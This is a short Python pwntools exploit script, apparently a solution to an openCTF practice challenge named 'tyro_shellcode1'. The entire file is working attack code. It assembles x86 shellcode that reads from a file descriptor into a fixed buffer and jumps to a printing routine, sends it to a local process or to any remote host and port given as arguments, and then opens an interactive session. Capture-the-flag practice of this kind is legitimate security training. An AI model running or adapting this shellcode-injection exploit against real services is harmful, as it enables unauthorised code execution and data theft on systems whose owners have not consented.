#!/usr/bin/env python

from pwn import *
import sys

def sh():
	s = '''xor eax, eax
	xor ebx, ebx
	mov bl, 3
	mov ecx, 0x804a140
	mov al, 3
	mov dl, 0xff
	int 0x80
	push 0x804a140
	push 0x8048728
	ret
	'''

	return asm(s)

def exploit(r):
	r.recvuntil(' ... ')
	addr = int(r.recv(10), 16)
	log.info("Addr is at: " + hex(addr))
	r.send(sh())
	r.interactive()



if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_shellcode1_84536cf714f0c7cc4786bb226f3a866c'])
        print util.proc.pidof(r)
        pause()
        exploit(r)